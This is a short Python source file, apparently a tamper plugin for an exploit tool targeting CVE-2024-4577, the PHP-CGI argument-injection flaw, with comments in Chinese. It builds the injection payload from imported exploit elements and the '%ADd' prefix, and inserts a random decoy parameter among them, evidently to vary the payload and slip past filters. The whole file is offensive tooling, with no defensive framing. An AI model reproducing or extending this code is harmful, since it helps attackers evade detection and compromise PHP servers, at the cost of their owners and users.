# tamper_insert_dummy_element.py

import random
import string
from exploit import PAYLOAD_ELEMENTS, CVE_PREFIXES  

name = "tamper_insert_dummy_element"
description = "從 payload 元素中隨機插入一個干擾用的隨機假參數（非真實 PHP 設定）"

def generate_fake_element():
    key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{key}%3d1"

def tamper(data):
    ids = data.get("element_ids")
    cve = data.get("cve_id", "CVE-2024-4577")
    prefix = CVE_PREFIXES.get(cve, "%ADd")

    if not ids or not isinstance(ids, list):
        return data

    # 插入位置：隨機 1~len (不在最前面)
    insert_index = random.randint(1, len(ids))

    # 建立新 element 列表，並插入假參數
    modified = ids.copy()

    # 隨機產生假參數
    fake_payload = generate_fake_element()

    # 將 fake payload 插入對應位置（作為字串）
    new_payload_parts = []
    for i, eid in enumerate(modified):
        if i == insert_index:
            new_payload_parts.append(f"{prefix}+{fake_payload}")
        new_payload_parts.append(f"{prefix}+{PAYLOAD_ELEMENTS[eid]}")

    # 更新 payload
    data["payload"] = '+'.join(new_payload_parts)
    return data
